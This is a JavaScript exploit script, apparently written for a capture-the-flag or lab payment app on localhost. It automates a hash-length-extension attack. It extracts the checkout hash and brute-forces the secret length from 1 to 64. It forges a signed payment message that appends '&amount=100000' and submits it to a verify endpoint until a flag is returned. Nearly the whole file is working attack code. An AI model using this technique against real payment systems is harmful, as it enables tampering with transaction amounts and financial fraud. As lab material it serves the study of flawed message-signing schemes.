const BASE = process.env.TARGET_BASE_URL ?? "http://localhost:3000";

async function main() {
  const issueRes = await fetch(`${BASE}/api/checkout`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      cart: [
        { itemId: "water", quantity: 2 },
        { itemId: "phone", quantity: 1 }
      ]
    })
  });
  const issued = await issueRes.json();

  if (!issueRes.ok) {
    console.error("Issue failed:", issued);
    process.exit(1);
  }

  const originalMessage = issued.message;
  const originalHash = new URL(issued.payUrl, BASE).searchParams.get("hash");
  if (!originalHash) {
    throw new Error("Could not extract original hash");
  }

  const originalMessageBase64 = Buffer.from(originalMessage, "utf8").toString("base64");
  const appendText = "&amount=100000";

  for (let guess = 1; guess <= 64; guess++) {
    const forgeRes = await fetch(`${BASE}/api/forge`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        originalMessageBase64,
        originalHash,
        guessedSecretLength: guess,
        appendText
      })
    });
    const forged = await forgeRes.json();
    if (!forgeRes.ok) continue;

    const verifyRes = await fetch(`${BASE}/api/verify`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        messageBase64: forged.forgedMessageBase64,
        hash: forged.forgedHash,
        mode: "vulnerable"
      })
    });
    const verify = await verifyRes.json();
    if (verify.flag) {
      console.log("SUCCESS: payment flow exploited");
      console.log("Secret length guess:", guess);
      console.log("Flag:", verify.flag);
      return;
    }
  }

  console.log("Exploit failed. Try increasing secret-length search range.");
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
